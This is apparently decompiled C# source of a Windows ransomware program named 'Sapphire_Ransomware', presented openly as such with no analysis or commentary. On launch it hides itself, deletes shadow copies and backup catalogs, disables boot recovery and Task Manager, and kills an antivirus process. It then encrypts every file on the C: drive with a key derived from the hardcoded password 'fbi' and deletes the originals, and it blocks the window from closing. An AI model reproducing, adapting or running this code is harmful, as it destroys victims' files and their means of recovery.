using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Sapphire_Ransomware.My;

namespace Sapphire_Ransomware;

[DesignerGenerated]
public class Form1 : Form
{
	public enum CryptoAction
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	private object RegistryKey;

	private string strFileToEncrypt;

	private string strFileToDecrypt;

	private string strOutputEncrypt;

	private string strOutputDecrypt;

	private FileStream fsInput;

	private string filenamez;

	private FileStream fsOutput;

	private IContainer components;

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar2")]
	internal virtual ProgressBar ProgressBar2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button1")]
	internal virtual Button Button1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button2")]
	internal virtual Button Button2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button3")]
	internal virtual Button Button3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox1")]
	internal virtual CheckBox CheckBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox2")]
	internal virtual CheckBox CheckBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox3")]
	internal virtual CheckBox CheckBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox4")]
	internal virtual CheckBox CheckBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox5")]
	internal virtual CheckBox CheckBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button4")]
	internal virtual Button Button4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button5")]
	internal virtual Button Button5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button6")]
	internal virtual Button Button6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button7")]
	internal virtual Button Button7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox6")]
	internal virtual CheckBox CheckBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox7")]
	internal virtual CheckBox CheckBox7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox8")]
	internal virtual CheckBox CheckBox8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Interaction.Shell("cmd /c takeown /F C:\\ /R /D /Y", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c takeown /F C:\\Windows /R /D /Y", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c takeown /F C:\\Windows\\System32 /R /D /Y", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c takeown /F D:\\ /R /D /Y", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c takeown /F %Windir%\\System32\\LogFiles\\WMI\\RtBackup /R /D /Y", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c takeown /F C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup /R /D /Y", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c rd C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup /s /q", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c rd %Windir%\\System32\\LogFiles\\WMI\\RtBackup /s /q", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c vssadmin delete shadows /all /quiet", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c wmic shadowcopy delete", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c vssadmin Delete Shadows /For=C: /All /Quiet", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c bcdedit /set {default} recoveryenabled No", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c bcdedit /set bootstatuspolicy ignoreallfailures", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c bcdedit  /set recoveryenabled NO", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c wbadmin delete catalog -quiet", (AppWinStyle)2, false, -1);
		Interaction.Shell("cmd /c taskkill /f /im avastui.exe", (AppWinStyle)2, false, -1);
		RegistryKey = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
		NewLateBinding.LateCall(RegistryKey, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, true);
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles("C:", (SearchOption)3, new string[0]))
		{
			if (!file.EndsWith(".fbi"))
			{
				ListBox1.get_Items().Add((object)file);
			}
		}
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		checked
		{
			byte[] array2 = new byte[array.GetUpperBound(0) + 1];
			int upperBound = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			byte[] array3 = new SHA512Managed().ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	public byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		checked
		{
			byte[] array2 = new byte[array.GetUpperBound(0) + 1];
			int upperBound = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			byte[] array3 = new SHA512Managed().ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
				fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
				fsOutput.SetLength(0L);
				byte[] buffer = new byte[4097];
				long num = 0L;
				long length = fsInput.Length;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				ProgressBar2.set_Value(0);
				ProgressBar2.set_Maximum(100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (Direction)
				{
				case CryptoAction.ActionDecrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				case CryptoAction.ActionEncrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				}
				while (num < length)
				{
					int num2 = fsInput.Read(buffer, 0, 4096);
					cryptoStream.Write(buffer, 0, num2);
					num += num2;
					ProgressBar2.set_Value((int)Math.Round((double)num / (double)length * 100.0));
				}
				cryptoStream.Close();
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionEncrypt)
				{
					new FileInfo(strFileToEncrypt).Delete();
				}
				if (Direction == CryptoAction.ActionDecrypt)
				{
					new FileInfo(strFileToDecrypt).Delete();
				}
				string text = "\r\n";
				if (Direction == CryptoAction.ActionEncrypt)
				{
					Interaction.MsgBox((object)("Encryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
				else
				{
					Interaction.MsgBox((object)("Decryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
			}
			catch (Exception projectError) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(projectError);
				return Information.Err().get_Number() == 53;
			}).Invoke())
			{
				Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
				ProjectData.ClearProjectError();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionDecrypt)
				{
					new FileInfo(filenamez).Delete();
				}
				else
				{
					new FileInfo(filenamez).Delete();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		ProgressBar1.set_Maximum(ListBox1.get_Items().get_Count());
		if (ProgressBar1.get_Value() == ListBox1.get_Items().get_Count())
		{
			Timer1.Stop();
			((Control)MyProject.Forms.Form2).Show();
			((Control)this).Hide();
			return;
		}
		ListBox1.set_SelectedIndex(ProgressBar1.get_Value());
		ListBox1.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox1.get_SelectedItem());
		try
		{
			byte[] bytKey = CreateKey("fbi");
			byte[] bytIV = CreateIV("fbi");
			EncryptOrDecryptFile(filenamez, filenamez + ".fbi", bytKey, bytIV, CryptoAction.ActionEncrypt);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar1.Increment(1);
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		ProgressBar1 = new ProgressBar();
		ProgressBar2 = new ProgressBar();
		Timer1 = new Timer(components);
		GroupBox1 = new GroupBox();
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		CheckBox3 = new CheckBox();
		CheckBox4 = new CheckBox();
		CheckBox5 = new CheckBox();
		Button4 = new Button();
		Button5 = new Button();
		Button6 = new Button();
		Button7 = new Button();
		CheckBox6 = new CheckBox();
		CheckBox7 = new CheckBox();
		CheckBox8 = new CheckBox();
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(12, 12));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(389, 420));
		((Control)ListBox1).set_TabIndex(0);
		((Control)ProgressBar1).set_Location(new Point(448, 392));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(327, 23));
		((Control)ProgressBar1).set_TabIndex(1);
		((Control)ProgressBar2).set_Location(new Point(449, 298));
		((Control)ProgressBar2).set_Name("ProgressBar2");
		((Control)ProgressBar2).set_Size(new Size(327, 23));
		((Control)ProgressBar2).set_TabIndex(2);
		Timer1.set_Enabled(true);
		((Control)GroupBox1).set_Location(new Point(616, 118));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(200, 100));
		((Control)GroupBox1).set_TabIndex(3);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		((Control)Button1).set_Location(new Point(547, 31));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(75, 23));
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)Button2).set_Location(new Point(428, 102));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(210, 181));
		((Control)Button2).set_TabIndex(5);
		((ButtonBase)Button2).set_Text("DO NOT REVERSE ENGINER!");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((Control)Button3).set_Location(new Point(563, 47));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(75, 23));
		((Control)Button3).set_TabIndex(6);
		((ButtonBase)Button3).set_Text("Button3");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		((Control)CheckBox1).set_Location(new Point(643, 35));
		((Control)CheckBox1).set_Name("CheckBox1");
		((Control)CheckBox1).set_Size(new Size(81, 17));
		((Control)CheckBox1).set_TabIndex(7);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		((Control)CheckBox2).set_Location(new Point(579, 63));
		((Control)CheckBox2).set_Name("CheckBox2");
		((Control)CheckBox2).set_Size(new Size(81, 17));
		((Control)CheckBox2).set_TabIndex(8);
		((ButtonBase)CheckBox2).set_Text("CheckBox2");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		((Control)CheckBox3).set_Location(new Point(587, 71));
		((Control)CheckBox3).set_Name("CheckBox3");
		((Control)CheckBox3).set_Size(new Size(81, 17));
		((Control)CheckBox3).set_TabIndex(9);
		((ButtonBase)CheckBox3).set_Text("CheckBox3");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox4).set_AutoSize(true);
		((Control)CheckBox4).set_Location(new Point(595, 79));
		((Control)CheckBox4).set_Name("CheckBox4");
		((Control)CheckBox4).set_Size(new Size(81, 17));
		((Control)CheckBox4).set_TabIndex(10);
		((ButtonBase)CheckBox4).set_Text("CheckBox4");
		((ButtonBase)CheckBox4).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox5).set_AutoSize(true);
		((Control)CheckBox5).set_Location(new Point(603, 87));
		((Control)CheckBox5).set_Name("CheckBox5");
		((Control)CheckBox5).set_Size(new Size(81, 17));
		((Control)CheckBox5).set_TabIndex(11);
		((ButtonBase)CheckBox5).set_Text("CheckBox5");
		((ButtonBase)CheckBox5).set_UseVisualStyleBackColor(true);
		((Control)Button4).set_Location(new Point(611, 95));
		((Control)Button4).set_Name("Button4");
		((Control)Button4).set_Size(new Size(75, 23));
		((Control)Button4).set_TabIndex(12);
		((ButtonBase)Button4).set_Text("Button4");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(true);
		((Control)Button5).set_Location(new Point(619, 103));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(75, 23));
		((Control)Button5).set_TabIndex(13);
		((ButtonBase)Button5).set_Text("Button5");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(true);
		((Control)Button6).set_Location(new Point(627, 111));
		((Control)Button6).set_Name("Button6");
		((Control)Button6).set_Size(new Size(75, 23));
		((Control)Button6).set_TabIndex(14);
		((ButtonBase)Button6).set_Text("Button6");
		((ButtonBase)Button6).set_UseVisualStyleBackColor(true);
		((Control)Button7).set_Location(new Point(635, 119));
		((Control)Button7).set_Name("Button7");
		((Control)Button7).set_Size(new Size(75, 23));
		((Control)Button7).set_TabIndex(15);
		((ButtonBase)Button7).set_Text("Button7");
		((ButtonBase)Button7).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox6).set_AutoSize(true);
		((Control)CheckBox6).set_Location(new Point(643, 127));
		((Control)CheckBox6).set_Name("CheckBox6");
		((Control)CheckBox6).set_Size(new Size(81, 17));
		((Control)CheckBox6).set_TabIndex(16);
		((ButtonBase)CheckBox6).set_Text("CheckBox6");
		((ButtonBase)CheckBox6).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox7).set_AutoSize(true);
		((Control)CheckBox7).set_Location(new Point(651, 135));
		((Control)CheckBox7).set_Name("CheckBox7");
		((Control)CheckBox7).set_Size(new Size(81, 17));
		((Control)CheckBox7).set_TabIndex(17);
		((ButtonBase)CheckBox7).set_Text("CheckBox7");
		((ButtonBase)CheckBox7).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox8).set_AutoSize(true);
		((Control)CheckBox8).set_Location(new Point(659, 143));
		((Control)CheckBox8).set_Name("CheckBox8");
		((Control)CheckBox8).set_Size(new Size(81, 17));
		((Control)CheckBox8).set_TabIndex(18);
		((ButtonBase)CheckBox8).set_Text("CheckBox8");
		((ButtonBase)CheckBox8).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(797, 458));
		((Control)this).get_Controls().Add((Control)(object)CheckBox8);
		((Control)this).get_Controls().Add((Control)(object)CheckBox7);
		((Control)this).get_Controls().Add((Control)(object)CheckBox6);
		((Control)this).get_Controls().Add((Control)(object)Button7);
		((Control)this).get_Controls().Add((Control)(object)Button6);
		((Control)this).get_Controls().Add((Control)(object)Button5);
		((Control)this).get_Controls().Add((Control)(object)Button4);
		((Control)this).get_Controls().Add((Control)(object)CheckBox5);
		((Control)this).get_Controls().Add((Control)(object)CheckBox4);
		((Control)this).get_Controls().Add((Control)(object)CheckBox3);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
